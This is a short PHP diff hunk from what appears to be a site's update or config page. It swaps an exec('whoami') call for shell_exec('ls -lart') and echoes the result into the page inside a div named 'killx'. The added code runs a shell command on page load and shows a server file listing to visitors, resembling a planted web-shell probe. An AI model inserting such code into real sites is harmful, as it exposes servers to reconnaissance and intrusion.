@@ -59,9 +59,8 @@ $update = $Config->checkUpdate();
     </div>
 	<div id="killx">
 	<?php
-		$kekus      = 'N.A';
-		exec('whoami', $kekus);
-		echo $kekus;
+		$output = shell_exec('ls -lart');
+		echo "<pre>$output</pre>";
 	?>
 
 
